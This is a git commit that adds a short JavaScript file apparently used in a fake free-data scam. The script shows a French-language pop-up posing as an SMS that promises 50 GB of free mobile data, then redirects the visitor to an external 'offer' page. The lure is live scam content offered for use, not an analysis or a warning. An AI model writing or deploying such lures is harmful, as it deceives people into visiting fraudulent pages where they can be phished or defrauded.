ff3f4f997a09e26eb3ac6c29dc5a06bb9d521438
harryjohnson86 <mfonjohnson86@gmail.com>
2025-01-12 05:08:22 -0800

    Create president-20gb.dataoffer.js

---
+++ president-20gb.dataoffer.js
@@ -0,0 +1,5 @@
+var password = '50 Go de données gratuites'
+password=prompt('SMS: Félicitations, votre numéro est éligible pour recevoir 50 Go, veuillez appuyer sur OK pour ACTIVER. ','50 Go de données gratuites');
+if (password != '50 Go de données gratuites') {
+location.href='https://offerforall.info/president-20gb.dataoffer.html';
+}
